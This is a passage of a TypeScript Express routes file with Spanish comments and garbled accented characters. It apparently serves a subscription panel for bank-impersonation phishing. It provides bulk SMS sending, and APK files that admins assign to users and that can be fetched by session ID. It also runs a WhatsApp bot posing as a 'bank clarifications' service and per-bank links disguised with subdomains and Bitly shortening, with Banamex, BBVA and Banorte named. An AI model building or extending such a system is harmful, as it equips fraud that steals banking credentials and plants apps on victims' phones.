console.log(` SMS enviados exitosamente por administrador v铆a ${selectedRoute}. No se descontaron cr茅ditos.`);\n        }\n      } else {\n        failedCount = processedNumbers.length;\n        console.log(` Error enviando SMS v铆a ${selectedRoute}: ${smsResult.error}`);\n      }\n\n      // Guardar historial de env铆os con informaci贸n de ruta y costo\n      const historyPromises = processedNumbers.map(async (phoneNumber) => {\n        return storage.addSmsToHistory({\n          userId: user.id,\n          phoneNumber,\n          message,\n          sessionId: req.body.sessionId || null,\n          routeType: selectedRoute,\n          creditCost: (selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? 1 : 1).toString()\n        });\n      });\n\n      await Promise.all(historyPromises);\n\n      // Obtener cr茅ditos actualizados\n      const finalCredits = await storage.getUserSmsCredits(user.id);\n\n      res.json({\n        success: true,\n        data: {\n          sent: successCount,\n          failed: failedCount,\n          total: processedNumbers.length,\n          routeType: selectedRoute,\n          routeCostPerSMS: selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? 1 : 1,\n          creditsUsed: creditsUsed,\n          remainingCredits: finalCredits,\n          smsResponse: smsResult.data || null,\n          error: smsResult.error || null\n        }\n      });\n\n    } catch (error: any) {\n      console.error('Error enviando SMS:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Rutas del bot de Telegram y 2FA\n  app.post('/api/telegram/send-verification', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { sendVerificationCode } = await import('./telegramBot');\n      const user = req.user;\n      \n      const result = await sendVerificationCode(user.id, user.username);\n      \n      if (result.success) {\n        res.json({ success: true, message: 'C贸digo de verificaci贸n enviado' });\n      } else {\n        res.status(400).json({ success: false, message: result.error });\n      }\n    } catch (error: any) {\n      console.error('Error enviando c贸digo 2FA:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  app.post('/api/telegram/verify-code', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { verifyCode } = await import('./telegramBot');\n      const { code } = req.body;\n      const user = req.user;\n      \n      if (!code) {\n        return res.status(400).json({ success: false, message: 'C贸digo requerido' });\n      }\n\n      const result = await verifyCode(user.id, code);\n      \n      if (result.success) {\n        res.json({ success: true, message: 'C贸digo verificado correctamente' });\n      } else {\n        res.status(400).json({ success: false, message: result.error });\n      }\n    } catch (error: any) {\n      console.error('Error verificando c贸digo 2FA:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  app.post('/api/telegram/send-admin-message', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { sendAdminMessage, sendBroadcastMessage } = await import('./telegramBot');\n      const { message, userChatId, isBroadcast } = req.body;\n      \n      if (!message) {\n        return res.status(400).json({ success: false, message: 'Mensaje requerido' });\n      }\n\n      let result;\n      if (isBroadcast) {\n        result = await sendBroadcastMessage(message, user.username);\n        res.json({ \n          success: result.success, \n          message: `Mensaje enviado a ${result.sent} usuarios, ${result.failed} fallidos`,\n          sent: result.sent,\n          failed: result.failed,\n          errors: result.errors\n        });\n      } else if (userChatId) {\n        result = await sendAdminMessage(userChatId, message, user.username);\n        if (result.success) {\n          res.json({ success: true, message: 'Mensaje enviado correctamente' });\n        } else {\n          res.status(400).json({ success: false, message: result.error });\n        }\n      } else {\n        res.status(400).json({ success: false, message: 'Chat ID o broadcast requerido' });\n      }\n    } catch (error: any) {\n      console.error('Error enviando mensaje de administrador:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Enviar mensaje directo a un usuario espec铆fico por su username\n  app.post('/api/telegram/send-direct-message', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { sendAdminMessage } = await import('./telegramBot');\n      const { message, username } = req.body;\n      \n      if (!message) {\n        return res.status(400).json({ success: false, message: 'Mensaje requerido' });\n      }\n\n      if (!username) {\n        return res.status(400).json({ success: false, message: 'Username requerido' });\n      }\n\n      // Buscar el usuario por username para obtener su Chat ID\n      const targetUser = await storage.getUserByUsername(username);\n      if (!targetUser) {\n        return res.status(404).json({ success: false, message: 'Usuario no encontrado' });\n      }\n\n      if (!targetUser.telegramChatId) {\n        return res.status(400).json({ success: false, message: 'El usuario no tiene Chat ID configurado' });\n      }\n\n      const result = await sendAdminMessage(targetUser.telegramChatId, message, user.username);\n      \n      if (result.success) {\n        res.json({ \n          success: true, \n          message: `Mensaje enviado a ${username} correctamente` \n        });\n      } else {\n        res.status(400).json({ success: false, message: result.error });\n      }\n    } catch (error: any) {\n      console.error('Error enviando mensaje directo:', error);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Endpoint para subir archivos APK\n  app.post('/api/upload-apk', upload.single('apkFile'), async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      if (!req.file) {\n        return res.status(400).json({ message: \"No se proporcion贸 archivo APK\" });\n      }\n\n      // Verificar que sea un archivo APK\n      if (!req.file.originalname.toLowerCase().endsWith('.apk')) {\n        return res.status(400).json({ message: \"El archivo debe ser un APK (.apk)\" });\n      }\n\n      // Generar URL del archivo APK\n      const apkFileUrl = `/uploads/${req.file.filename}`;\n      \n      console.log(`APK ${req.file.originalname} subido por administrador ${user.username}`);\n\n      res.json({\n        success: true,\n        fileName: req.file.originalname,\n        fileUrl: apkFileUrl,\n        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'\n      });\n    } catch (error) {\n      console.error(\"Error uploading APK:\", error);\n      res.status(500).json({ message: \"Error al subir APK\" });\n    }\n  });\n\n  // Endpoint para asignar APK a un usuario\n  app.post('/api/assign-apk', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { userId, apkFileName, apkFileUrl } = req.body;\n\n      if (!userId) {\n        return res.status(400).json({ message: \"UserId es requerido\" });\n      }\n\n      // Verificar que el usuario existe\n      const targetUser = await storage.getUserById(parseInt(userId));\n      if (!targetUser) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Asignar o remover APK del usuario\n      await storage.updateUser(parseInt(userId), {\n        apkFileName: apkFileName || null,\n        apkFileUrl: apkFileUrl || null\n      });\n\n      if (apkFileName && apkFileUrl) {\n        console.log(`APK ${apkFileName} asignado al usuario ${targetUser.username} por ${user.username}`);\n        res.json({\n          success: true,\n          message: `APK asignado correctamente a ${targetUser.username}`\n        });\n      } else {\n        console.log(`APK removido del usuario ${targetUser.username} por ${user.username}`);\n        res.json({\n          success: true,\n          message: `APK removido correctamente de ${targetUser.username}`\n        });\n      }\n    } catch (error) {\n      console.error(\"Error assigning APK:\", error);\n      res.status(500).json({ message: \"Error al asignar APK\" });\n    }\n  });\n\n  // Endpoint para obtener el APK asignado al usuario de una sesi贸n\n  app.get('/api/get-user-apk/:sessionId', async (req, res) => {\n    try {\n      const { sessionId } = req.params;\n\n      // Obtener la sesi贸n\n      const session = await storage.getSessionById(sessionId);\n      if (!session) {\n        return res.status(404).json({ message: \"Sesi贸n no encontrada\" });\n      }\n\n      // Obtener el usuario que cre贸 la sesi贸n\n      if (!session.createdBy) {\n        return res.status(404).json({ message: \"No hay usuario asociado a la sesi贸n\" });\n      }\n\n      const user = await storage.getUserByUsername(session.createdBy);\n      if (!user) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Verificar si tiene APK asignado\n      if (!user.apkFileName || !user.apkFileUrl) {\n        return res.status(404).json({ message: \"No hay APK asignado a este usuario\" });\n      }\n\n      res.json({\n        success: true,\n        apkFileName: user.apkFileName,\n        apkFileUrl: user.apkFileUrl,\n        userName: user.username\n      });\n    } catch (error) {\n      console.error(\"Error getting user APK:\", error);\n      res.status(500).json({ message: \"Error al obtener APK del usuario\" });\n    }\n  });\n\n  // Endpoint para obtener lista de usuarios para asignaci贸n de APK\n  app.get('/api/users-for-apk', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const user = req.user;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const users = await storage.getAllUsers();\n      \n      // Filtrar solo usuarios activos y mapear datos relevantes\n      const userList = users\n        .filter(u => u.isActive && u.role === UserRole.USER)\n        .map(u => ({\n          id: u.id,\n          username: u.username,\n          apkFileName: u.apkFileName,\n          apkFileUrl: u.apkFileUrl,\n          hasApk: !!u.apkFileName\n        }));\n\n      res.json(userList);\n    } catch (error) {\n      console.error(\"Error getting users for APK:\", error);\n      res.status(500).json({ message: \"Error al obtener usuarios\" });\n    }\n  });\n\n  // Ruta temporal para probar notificaciones de activaci贸n\n  app.post(\"/api/test-activation-notification\", async (req, res) => {\n    try {\n      \n      // Usuario de prueba con Chat ID del admin configurado\n      const testUserData = {\n        username: \"usuario_prueba\",\n        telegramChatId: process.env.ADMIN_CHAT_ID || \"\",\n        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 1 d铆a\n        allowedBanks: \"banamex,bbva,banorte\"\n      };\n\n      const result = await sendAccountActivationNotification(testUserData);\n      \n      if (result.success) {\n        res.json({ \n          success: true, \n          message: \"Notificaci贸n de activaci贸n enviada correctamente\",\n          userData: testUserData\n        });\n      } else {\n        res.status(400).json({ \n          success: false, \n          error: result.error \n        });\n      }\n    } catch (error: any) {\n      console.error(\"Error en prueba de notificaci贸n:\", error);\n      res.status(500).json({ \n        success: false, \n        error: error.message \n      });\n    }\n  });\n\n  // Rutas de configuraci贸n del sistema (precio de suscripci贸n)\n  app.get(\"/api/system-config\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    if (req.user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const config = await storage.getSystemConfig();\n      res.json(config || { subscriptionPrice: '0' });\n    } catch (error) {\n      console.error(\"Error getting system config:\", error);\n      res.status(500).json({ message: \"Error al obtener configuraci贸n\" });\n    }\n  });\n\n  app.post(\"/api/system-config\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    if (req.user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { subscriptionPrice } = req.body;\n      \n      if (!subscriptionPrice || isNaN(parseFloat(subscriptionPrice))) {\n        return res.status(400).json({ message: \"Precio de suscripci贸n inv谩lido\" });\n      }\n\n      const config = await storage.updateSystemConfig({\n        subscriptionPrice: subscriptionPrice.toString(),\n        updatedBy: req.user.id\n      });\n\n      res.json(config);\n    } catch (error) {\n      console.error(\"Error updating system config:\", error);\n      res.status(500).json({ message: \"Error al actualizar configuraci贸n\" });\n    }\n  });\n\n  // Ruta para actualizar precio personalizado de usuario\n  app.patch(\"/api/users/:userId/custom-price\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    if (req.user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      // Validar par谩metro userId\n      const userIdSchema = z.object({\n        userId: z.string().regex(/^\\d+$/).transform(Number)\n      });\n      \n      const { userId } = userIdSchema.parse({ userId: req.params.userId });\n      \n      // Validar el cuerpo con Zod\n      const customPriceSchema = z.object({\n        customPrice: z.union([\n          z.string().regex(/^\\d+(\\.\\d{1,2})?$/, {\n            message: \"El precio debe tener formato v谩lido (ej: 150 o 150.50)\"\n          }).refine(val => parseFloat(val) > 0, {\n            message: \"El precio debe ser un n煤mero positivo\"\n          }),\n          z.null()\n        ])\n      });\n\n      const validatedData = customPriceSchema.parse(req.body);\n      \n      // Normalizar el precio a 2 decimales si no es null\n      let priceValue: string | null = null;\n      if (validatedData.customPrice !== null) {\n        const numericPrice = parseFloat(validatedData.customPrice);\n        priceValue = numericPrice.toFixed(2);\n      }\n\n      await storage.updateUser(userId, {\n        customPrice: priceValue\n      });\n\n      const updatedUser = await storage.getUserById(userId);\n      res.json(updatedUser);\n    } catch (error) {\n      if (error instanceof z.ZodError) {\n        return res.status(400).json({ message: error.errors[0].message });\n      }\n      console.error(\"Error updating user custom price:\", error);\n      res.status(500).json({ message: \"Error al actualizar precio personalizado\" });\n    }\n  });\n\n  // Rutas de pagos\n  app.get(\"/api/payments/pending\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    if (req.user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const payments = await storage.getPendingPayments();\n      res.json(payments);\n    } catch (error) {\n      console.error(\"Error getting pending payments:\", error);\n      res.status(500).json({ message: \"Error al obtener pagos pendientes\" });\n    }\n  });\n\n  app.get(\"/api/payments/user/:userId\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const userId = parseInt(req.params.userId);\n    \n    // Los usuarios pueden ver sus propios pagos, los admins pueden ver todos\n    if (req.user.role !== UserRole.ADMIN && req.user.id !== userId) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const payments = await storage.getUserPayments(userId);\n      res.json(payments);\n    } catch (error) {\n      console.error(\"Error getting user payments:\", error);\n      res.status(500).json({ message: \"Error al obtener pagos del usuario\" });\n    }\n  });\n\n  // Crear pago pendiente para un usuario (usa precio personalizado si existe)\n  app.post(\"/api/payments/create-pending\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    if (req.user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      // Validar el cuerpo con Zod\n      const createPaymentSchema = z.object({\n        userId: z.number().int().positive()\n      });\n\n      const validatedData = createPaymentSchema.parse(req.body);\n\n      // Obtener el usuario para verificar si tiene precio personalizado\n      const user = await storage.getUserById(validatedData.userId);\n      if (!user) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Determinar el precio a usar\n      let amount: string;\n      if (user.customPrice) {\n        // Usar precio personalizado del usuario (validar y normalizar)\n        const customPriceNum = parseFloat(user.customPrice);\n        if (!isFinite(customPriceNum) || customPriceNum <= 0) {\n          return res.status(400).json({ \n            message: \"El precio personalizado del usuario es inv谩lido. Actual铆celo antes de crear el pago.\" \n          });\n        }\n        amount = customPriceNum.toFixed(2);\n      } else {\n        // Usar precio del sistema (validar y normalizar)\n        const systemConfig = await storage.getSystemConfig();\n        const systemPriceNum = systemConfig?.subscriptionPrice ? parseFloat(systemConfig.subscriptionPrice) : NaN;\n        \n        if (!isFinite(systemPriceNum) || systemPriceNum <= 0) {\n          return res.status(400).json({ \n            message: \"No hay precio del sistema v谩lido configurado. Configure el precio del sistema o un precio personalizado para este usuario.\" \n          });\n        }\n        amount = systemPriceNum.toFixed(2);\n      }\n\n      // Generar c贸digo de referencia 煤nico para el pago\n      const { generatePaymentReferenceCode } = await import('./telegramBot');\n      const referenceCode = generatePaymentReferenceCode();\n      \n      // Expira en 24 horas\n      const expiresAt = new Date();\n      expiresAt.setHours(expiresAt.getHours() + 24);\n\n      // Crear el pago pendiente\n      const payment = await storage.createPayment({\n        userId: user.id,\n        amount,\n        referenceCode,\n        status: 'pending',\n        expiresAt,\n        verificationAttempts: 0\n      });\n\n      res.json(payment);\n    } catch (error) {\n      if (error instanceof z.ZodError) {\n        return res.status(400).json({ message: error.errors[0].message });\n      }\n      console.error(\"Error creating pending payment:\", error);\n      res.status(500).json({ message: \"Error al crear pago pendiente\" });\n    }\n  });\n\n  // ==================== WHATSAPP BOT ROUTES ====================\n  \n  // Obtener configuraci贸n de WhatsApp\n  app.get(\"/api/whatsapp/config\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const config = await storage.getWhatsAppConfig(req.user.id);\n      \n      // Si no existe configuraci贸n, crear una por defecto\n      if (!config) {\n        const defaultConfig = await storage.createWhatsAppConfig({\n          userId: req.user.id,\n          phoneNumber: '',\n          welcomeMessage: 'Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.\\n\\nPor favor selecciona una opci贸n:',\n          isConnected: false,\n          qrCode: null\n        });\n        return res.json(defaultConfig);\n      }\n      \n      res.json(config);\n    } catch (error) {\n      console.error(\"Error obteniendo configuraci贸n de WhatsApp:\", error);\n      res.status(500).json({ message: \"Error al obtener configuraci贸n\" });\n    }\n  });\n\n  // Iniciar bot de WhatsApp y obtener QR\n  app.post(\"/api/whatsapp/start\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      // Usar el gestor de bots para iniciar el bot de este usuario\n      await whatsappBotManager.startBot(req.user.id, storage);\n\n      res.json({ success: true, message: \"Bot iniciado, escanea el c贸digo QR\" });\n    } catch (error) {\n      console.error(\"Error iniciando bot de WhatsApp:\", error);\n      res.status(500).json({ message: \"Error al iniciar bot de WhatsApp\" });\n    }\n  });\n\n  // Detener bot de WhatsApp\n  app.post(\"/api/whatsapp/stop\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      // Usar el gestor de bots para detener el bot de este usuario\n      await whatsappBotManager.stopBot(req.user.id);\n\n      // Actualizar configuraci贸n\n      await storage.updateWhatsAppConfig(req.user.id, {\n        isConnected: false,\n        qrCode: null\n      });\n\n      res.json({ success: true });\n    } catch (error) {\n      console.error(\"Error deteniendo bot de WhatsApp:\", error);\n      res.status(500).json({ message: \"Error al detener bot de WhatsApp\" });\n    }\n  });\n\n  // Obtener estado de conexi贸n\n  app.get(\"/api/whatsapp/status\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const config = await storage.getWhatsAppConfig(req.user.id);\n      const bot = whatsappBotManager.getBot(req.user.id);\n      const isConnected = bot?.isConnected() || false;\n\n      res.json({ \n        isConnected,\n        qrCode: config?.qrCode || null,\n        phoneNumber: config?.phoneNumber || ''\n      });\n    } catch (error) {\n      console.error(\"Error obteniendo estado de WhatsApp:\", error);\n      res.status(500).json({ message: \"Error al obtener estado\" });\n    }\n  });\n\n  // Actualizar configuraci贸n de WhatsApp\n  app.post(\"/api/whatsapp/config\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const { welcomeMessage, phoneNumber } = req.body;\n      \n      const existingConfig = await storage.getWhatsAppConfig(req.user.id);\n      let config;\n      \n      if (existingConfig) {\n        config = await storage.updateWhatsAppConfig(req.user.id, {\n          welcomeMessage,\n          phoneNumber\n        });\n      } else {\n        config = await storage.createWhatsAppConfig({\n          userId: req.user.id,\n          welcomeMessage,\n          phoneNumber: phoneNumber || '',\n          isConnected: false,\n          qrCode: null\n        });\n      }\n      \n      res.json(config);\n    } catch (error) {\n      console.error(\"Error actualizando configuraci贸n de WhatsApp:\", error);\n      res.status(500).json({ message: \"Error al actualizar configuraci贸n\" });\n    }\n  });\n\n  // Obtener opciones de men煤\n  app.get(\"/api/whatsapp/menu\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const options = await storage.getWhatsAppMenuOptions(req.user.id);\n      res.json(options);\n    } catch (error) {\n      console.error(\"Error obteniendo opciones de men煤:\", error);\n      res.status(500).json({ message: \"Error al obtener opciones de men煤\" });\n    }\n  });\n\n  // Crear opci贸n de men煤\n  app.post(\"/api/whatsapp/menu\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const { optionNumber, optionText, responseMessage, actionType, parentId } = req.body;\n      \n      const option = await storage.createWhatsAppMenuOption({\n        userId: req.user.id,\n        optionNumber,\n        optionText,\n        responseMessage,\n        actionType,\n        parentId: parentId || null\n      });\n      \n      res.json(option);\n    } catch (error) {\n      console.error(\"Error creando opci贸n de men煤:\", error);\n      res.status(500).json({ message: \"Error al crear opci贸n de men煤\" });\n    }\n  });\n\n  // Actualizar opci贸n de men煤\n  app.put(\"/api/whatsapp/menu/:id\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const { id } = req.params;\n      const { optionNumber, optionText, responseMessage, actionType, parentId } = req.body;\n      \n      // Verificar que la opci贸n pertenece al usuario antes de actualizar\n      const existingOptions = await storage.getWhatsAppMenuOptions(req.user.id);\n      const existingOption = existingOptions.find(o => o.id === parseInt(id));\n      \n      if (!existingOption) {\n        return res.status(404).json({ message: \"Opci贸n no encontrada o no tienes permisos para modificarla\" });\n      }\n      \n      const option = await storage.updateWhatsAppMenuOption(parseInt(id), {\n        optionNumber,\n        optionText,\n        responseMessage,\n        actionType,\n        parentId\n      });\n      \n      res.json(option);\n    } catch (error) {\n      console.error(\"Error actualizando opci贸n de men煤:\", error);\n      res.status(500).json({ message: \"Error al actualizar opci贸n de men煤\" });\n    }\n  });\n\n  // Eliminar opci贸n de men煤\n  app.delete(\"/api/whatsapp/menu/:id\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const { id } = req.params;\n      \n      // Verificar que la opci贸n pertenece al usuario antes de eliminar\n      const existingOptions = await storage.getWhatsAppMenuOptions(req.user.id);\n      const existingOption = existingOptions.find(o => o.id === parseInt(id));\n      \n      if (!existingOption) {\n        return res.status(404).json({ message: \"Opci贸n no encontrada o no tienes permisos para eliminarla\" });\n      }\n      \n      const deleted = await storage.deleteWhatsAppMenuOption(parseInt(id));\n      \n      if (deleted) {\n        res.json({ success: true });\n      } else {\n        res.status(404).json({ message: \"Opci贸n no encontrada\" });\n      }\n    } catch (error) {\n      console.error(\"Error eliminando opci贸n de men煤:\", error);\n      res.status(500).json({ message: \"Error al eliminar opci贸n de men煤\" });\n    }\n  });\n\n  // Enviar mensaje de prueba\n  app.post(\"/api/whatsapp/send-test\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const { phoneNumber } = req.body;\n      \n      // Obtener el bot de este usuario\n      const bot = whatsappBotManager.getBot(req.user.id);\n      \n      // Verificar que el bot est茅 conectado\n      if (!bot || !bot.isConnected()) {\n        return res.status(400).json({ \n          message: \"El bot de WhatsApp no est谩 conectado. Por favor escanea el c贸digo QR primero.\" \n        });\n      }\n      \n      // Obtener configuraci贸n y men煤\n      const config = await storage.getWhatsAppConfig(req.user.id);\n      const menuOptions = await storage.getWhatsAppMenuOptions(req.user.id);\n      \n      if (!config) {\n        return res.status(400).json({ message: \"No hay configuraci贸n de WhatsApp\" });\n      }\n      \n      // Construir mensaje con men煤\n      let message = config.welcomeMessage + '\\n\\n';\n      \n      menuOptions.forEach(option => {\n        message += `${option.optionNumber}. ${option.optionText}\\n`;\n      });\n      \n      // Enviar mensaje a trav茅s del bot\n      await bot.sendMessage(phoneNumber, message);\n      \n      res.json({ \n        success: true, \n        message: \"Mensaje enviado correctamente\",\n        previewMessage: message,\n        sentTo: phoneNumber\n      });\n    } catch (error) {\n      console.error(\"Error enviando mensaje de prueba:\", error);\n      res.status(500).json({ message: \"Error al enviar mensaje de prueba\" });\n    }\n  });\n\n  // Obtener conversaciones\n  app.get(\"/api/whatsapp/conversations\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const conversations = await storage.getWhatsAppConversations(req.user.id, 100);\n      res.json(conversations);\n    } catch (error) {\n      console.error(\"Error obteniendo conversaciones:\", error);\n      res.status(500).json({ message: \"Error al obtener conversaciones\" });\n    }\n  });\n\n  // ============================================================\n  // SISTEMA DE GESTIN DE LINKS CON SUBDOMINIOS Y BITLY\n  // ============================================================\n\n  // Crear un nuevo link con subdominio y acortamiento Bitly\n  app.post(\"/api/links\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { bankCode, sessionId, metadata } = req.body;\n\n      if (!bankCode) {\n        return res.status(400).json({ message: \"Se requiere el c贸digo del banco\" });\n      }\n\n      const link = await linkTokenService.createLink({\n        userId: req.user.id,\n        bankCode,\n        sessionId,\n        metadata\n      });\n\n      res.json({\n        success: true,\n        link: {\n          id: link.id,\n          token: link.token,\n          originalUrl: link.originalUrl,\n          shortUrl: link.shortUrl || link.originalUrl,\n          expiresAt: link.expiresAt\n        }\n      });\n    } catch (error: any) {\n      console.error(\"Error creando link:\", error);\n      res.status(500).json({ message: error.message || \"Error al crear link\" });\n    }\n  });\n\n  // Obtener sesiones activas con links\n  app.get(\"/api/links/active-sessions\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      // Query para traer sesiones activas con links activos\n      const { db } = await import('./db');\n      const activeSessions = await db\n        .select({\n          sessionId: sessions.sessionId,\n          folio: sessions.folio,\n          banco: sessions.banco,\n          createdAt: sessions.createdAt,\n          createdBy: sessions.createdBy,\n          linkId: linkTokens.id,\n          token: linkTokens.token,\n          originalUrl: linkTokens.originalUrl,\n          shortUrl: linkTokens.shortUrl,\n          linkStatus: linkTokens.status,\n          expiresAt: linkTokens.expiresAt,\n          usedAt: linkTokens.usedAt\n        })\n        .from(sessions)\n        .innerJoin(linkTokens, eq(sessions.sessionId, linkTokens.sessionId))\n        .where(\n          and(\n            eq(sessions.active, true),\n            eq(linkTokens.userId, req.user.id),\n            eq(linkTokens.status, 'active')\n          )\n        )\n        .orderBy(desc(linkTokens.createdAt));\n\n      // Calcular tiempo restante para cada link\n      const now = new Date();\n      const sessionsWithTimeRemaining = activeSessions.map((session: any) => {\n        const expiresAt = new Date(session.expiresAt);\n        const timeRemainingMs = Math.max(0, expiresAt.getTime() - now.getTime());\n        const isExpired = timeRemainingMs <= 0;\n        \n        const hours = Math.floor(timeRemainingMs / (1000 * 60 * 60));\n        const minutes = Math.floor((timeRemainingMs % (1000 * 60 * 60)) / (1000 * 60));\n        \n        return {\n          ...session,\n          timeRemainingMs,\n          timeRemainingFormatted: isExpired ? 'Expirado' : `${hours}h ${minutes}m`,\n          isExpired\n        };\n      });\n\n      res.json({\n        success: true,\n        sessions: sessionsWithTimeRemaining\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo sesiones activas con links:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener sesiones\" });\n    }\n  });\n\n  // Obtener historial de links del usuario\n  app.get(\"/api/links/history\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const limit = parseInt(req.query.limit as string) || 50;\n      const history = await linkTokenService.getLinkHistory(req.user.id, limit);\n      \n      res.json({\n        success: true,\n        links: history\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo historial de links:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener historial\" });\n    }\n  });\n\n  // Obtener cuota semanal de links\n  app.get(\"/api/links/quota\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const usage = await linkQuotaService.getCurrentUsage(req.user.id);\n      \n      res.json({\n        success: true,\n        quota: usage\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo cuota:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener cuota\" });\n    }\n  });\n\n  // Obtener cuota de links de un usuario espec铆fico (solo superadmin balonx)\n  app.get(\"/api/admin/users/:userId/link-quota\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    // Solo el superadmin balonx puede ver las cuotas de otros usuarios\n    if (req.user.username !== 'balonx') {\n      return res.status(403).json({ message: \"Solo el superadministrador puede ver las cuotas de usuarios\" });\n    }\n\n    try {\n      const userId = parseInt(req.params.userId, 10);\n      \n      // Validar que userId es un n煤mero v谩lido\n      if (isNaN(userId) || userId <= 0) {\n        return res.status(400).json({ message: \"ID de usuario inv谩lido\" });\n      }\n\n      // Verificar que el usuario existe\n      const user = await storage.getUserById(userId);\n      if (!user) {\n        return res.status(404).json({ message: 